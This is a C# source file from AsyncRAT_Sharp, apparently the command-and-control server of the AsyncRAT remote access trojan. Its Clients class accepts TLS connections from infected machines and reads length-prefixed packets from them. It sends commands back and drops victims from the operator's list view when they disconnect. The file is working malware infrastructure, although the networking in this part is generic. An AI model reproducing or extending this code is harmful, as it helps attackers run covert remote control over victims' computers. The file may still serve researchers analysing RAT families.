using System;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using AsyncRAT_Sharp.Handle_Packet;
using System.Security.Cryptography;
using System.Drawing;
using System.Diagnostics;
using System.Threading;
using AsyncRAT_Sharp.MessagePack;
using System.Text;
using System.Net.Security;
using System.Security.Authentication;
using System.Threading.Tasks;

namespace AsyncRAT_Sharp.Sockets
{
    public class Clients
    {
        public Socket ClientSocket { get; set; }
        public SslStream ClientSslStream { get; set; }
        public ListViewItem LV { get; set; }
        public ListViewItem LV2 { get; set; }
        public string ID { get; set; }
        private byte[] ClientBuffer { get; set; }
        private int ClientBuffersize { get; set; }
        private bool ClientBufferRecevied { get; set; }
        private MemoryStream ClientMS { get; set; }
        public object SendSync { get; } = new object();
        public long BytesRecevied { get; set; }

        public Clients(Socket socket)
        {
            ClientSocket = socket;
            ClientSslStream = new SslStream(new NetworkStream(ClientSocket, true), false);
            ClientSslStream.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, EndAuthenticate, null);
        }

        private void EndAuthenticate(IAsyncResult ar)
        {
            try
            {
                ClientSslStream.EndAuthenticateAsServer(ar);
                ClientBuffer = new byte[4];
                ClientMS = new MemoryStream();
                ClientSslStream.BeginRead(ClientBuffer, 0, ClientBuffer.Length, ReadClientData, null);
            }
            catch
            {
                //Settings.Blocked.Add(ClientSocket.RemoteEndPoint.ToString().Split(':')[0]);
                ClientSslStream?.Dispose();
                ClientSocket?.Dispose();
            }
        }

        public async void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!ClientSocket.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int Recevied = ClientSslStream.EndRead(ar);
                    if (Recevied > 0)
                    {
                        await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
                        if (!ClientBufferRecevied)
                        {
                            if (ClientMS.Length == 4)
                            {
                                ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                if (ClientBuffersize > 0)
                                {
                                    ClientBuffer = new byte[ClientBuffersize];
                                    Debug.WriteLine("/// Server Buffersize " + ClientBuffersize.ToString() + " Bytes  ///");
                                    ClientBufferRecevied = true;
                                }
                            }
                        }
                        else
                        {
                            Settings.Received += Recevied;
                            BytesRecevied += Recevied;
                            if (ClientMS.Length == ClientBuffersize)
                            {
                                ThreadPool.QueueUserWorkItem(Packet.Read, new object[] { ClientMS.ToArray(), this });
                                ClientBuffer = new byte[4];
                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                ClientBufferRecevied = false;
                            }
                            else
                                ClientBuffer = new byte[ClientBuffersize - ClientMS.Length];
                        }
                        ClientSslStream.BeginRead(ClientBuffer, 0, ClientBuffer.Length, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }

        public void Disconnected()
        {
            if (LV != null)
            {
                if (Program.form1.listView1.InvokeRequired)
                    Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                    {
                        try
                        {
                            lock (Settings.Listview1Lock)
                                LV.Remove();
                        }
                        catch { }
                    }));
                lock (Settings.Online)
                    Settings.Online.Remove(this);
            }

            try
            {
                ClientSslStream?.Close();
                ClientSocket?.Close();
                ClientSslStream?.Dispose();
                ClientSocket?.Dispose();
                ClientMS?.Dispose();
            }
            catch { }
        }

        public void Send(object msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!ClientSocket.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    if ((byte[])msg == null) return;

                    byte[] buffer = (byte[])msg;
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
                    ClientSslStream.Write(buffersize, 0, buffersize.Length);
                    ClientSslStream.Write(buffer, 0, buffer.Length);
                    ClientSslStream.Flush();
                    Debug.WriteLine("/// Server Sent " + buffer.Length.ToString() + " Bytes  ///");
                    Settings.Sent += buffer.Length;
                }
                catch
                {
                    Disconnected();
                    return;
                }

            }
        }

    }
}
